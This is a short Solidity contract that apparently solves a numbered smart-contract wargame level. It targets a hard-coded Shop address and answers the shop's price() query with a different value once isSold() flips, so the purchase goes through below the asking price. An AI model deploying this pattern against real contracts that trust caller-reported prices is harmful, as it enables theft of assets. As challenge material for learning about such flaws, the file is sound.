// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import {Shop} from "./L22__Shop.sol";

contract L22_Caller__Shop {
    Shop public shop = Shop(0xb4e4dA596aB21ddfD336875039D263b041797718);

    function buy() external {
        shop.buy();
    }

    function price() external view returns (uint256) {
        return shop.isSold() ? 0 : shop.price();
    }
}
